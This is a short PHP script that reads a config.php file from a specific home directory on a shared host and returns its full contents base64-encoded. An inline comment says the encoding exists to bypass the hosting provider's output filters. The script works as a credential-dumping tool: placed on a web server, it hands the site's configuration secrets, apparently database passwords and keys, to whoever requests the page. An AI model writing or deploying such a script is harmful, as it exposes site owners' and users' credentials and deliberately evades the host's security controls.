<?php
header('Content-Type: text/plain');

$path = '/home/u869064717/config.php';

if (!file_exists($path)) {
    echo "File not found";
    exit;
}

$content = file_get_contents($path);

// Output base64 encoded config to bypass hosting output filters
echo base64_encode($content);
exit;
